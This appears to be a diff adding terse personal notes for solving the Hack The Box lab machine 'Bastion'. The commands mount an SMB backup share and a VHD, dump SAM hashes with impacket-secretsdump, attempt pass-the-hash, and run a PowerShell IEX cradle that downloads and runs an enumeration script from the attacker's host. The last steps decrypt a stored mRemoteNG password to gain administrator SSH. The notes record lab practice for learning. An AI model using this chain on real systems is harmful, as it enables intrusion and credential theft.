@@ -1,0 +1,24 @@
+//based on IppSec
+
+smbclient -L //10.10.10.134
+sudo mount -t cifs //10.10.10.134/Backups /mnt/Backups
+guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd
+cd Windows/System32/config/
+cp SAM SYSTEM ~/Documents/htb/bastion/
+impacket-secretsdump -sam SAM -system SYSTEM local
+L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+smbmap -u L4mpje -p aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9 -H 10.10.10.134	//didnt get access to other dirs like C or Admin
+
+https://crackstation.net/
+L4mpje:26112010952d963c8dc4217daec986d9
+
+ssh L4mpje@10.10.10.134
+
+python -m SimpleHTTPServer
+IEX(New-Object Net.WebClient).DownloadString('https://10.10.14.3:8000/jaws-enum.ps1') 
+
+c:\Program Files\mRemoteNG
+type C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml 
+python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
+
+ssh administrator@10.10.10.134
